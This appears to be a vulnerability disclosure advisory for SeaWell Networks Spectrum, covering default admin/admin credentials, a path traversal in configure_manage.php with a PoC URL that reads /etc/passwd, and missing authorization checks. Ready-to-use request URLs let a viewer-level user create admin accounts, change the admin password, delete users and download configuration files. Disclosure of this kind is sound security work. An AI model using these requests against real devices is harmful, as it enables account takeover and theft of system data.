About SeaWell Networks Spectrum

Session Delivery Control

SeaWell set out to improve the way operators control, monetize and scale their IP video offerings, to meet the growing subscriber demands for video delivered to smartphones, tablets and game consoles.

The result – Spectrum – is what we call a “Multiscreen 2.0” Session Delivery Controller.

Spectrum is high-performance, carrier-grade software that takes ABR video and repackages it – on-the-fly – into any other protocol, including Apple HLS, Adobe HDS, Microsoft Smooth Streaming and MPEG-DASH.

A. CWE-255: Credentials Management
CVE-2015-8282

Weak, default login credentials - admin / admin

B. CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
CVE-2015-8283

The configure_manage.php module accepts a file parameter which takes an unrestricted file path as input, allowing an attacker (non-admin, low- privileged user) to read arbitrary files on the system.

PoC:

https://IP/configure_manage.php?action=download_config&file=../../../../../../../../../etc/passwd

C. CWE-285: Improper Authorization
CVE-2015-8284

A low privileged, non-admin user, with only viewer privileges, can perform administrative functions, such as create, update, delete a user (including admin user), or access device's configuration files (policy.xml, cookie_config.xml, systemCfg.xml). The application lacks Authorization controls to restrict any non-admin users from performing admin functions.

The application users can have admin or viewer privilege levels. Admin has full access to the device. Viewer has access to very restricted functions.

It is possible for a viewer priv user to perform admin functions.

PoC:

Add new user [Admin function only]

GET /system_manage.php?username=viewer&password=viewer&password=viewer&userlevel=1&action=add_user&ekey=&LActiveRow= HTTP/1.1

https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=

Here

admin -> userlevel=9
viewer -> userlevel=1

Create new user with Admin privs
Log in as viewer - try create new admin user - viewer1

https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=

<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>

Delete user

https://IP/system_manage.php?username=viewer1&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4

Modify existing user (including admin)
log in as viewer - try change system (admin) user

https://IP/system_manage.php?username=system&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4

<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>

Change Admin password
log in as viewer - try change admin pass

https://IP/system_manage.php?username=admin&password=admin1&password=admin1&userlevel=9&action=update_user&ekey=3&LActiveRow=sys_Luser_3

<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>

Downloading configuration xml files

viewer priv user has no access/option to config xmls via GUI. It is possible to download the configs by calling the url directly

Access policy config xml
https://IP/configure_manage.php?action=download_config&file=policy.xml

Access cookie config xml
https://IP/configure_manage.php?action=download_config&file=cookie_config.xml

Access system config xml
https://IP/configure_manage.php?action=download_config&file=systemCfg.xml
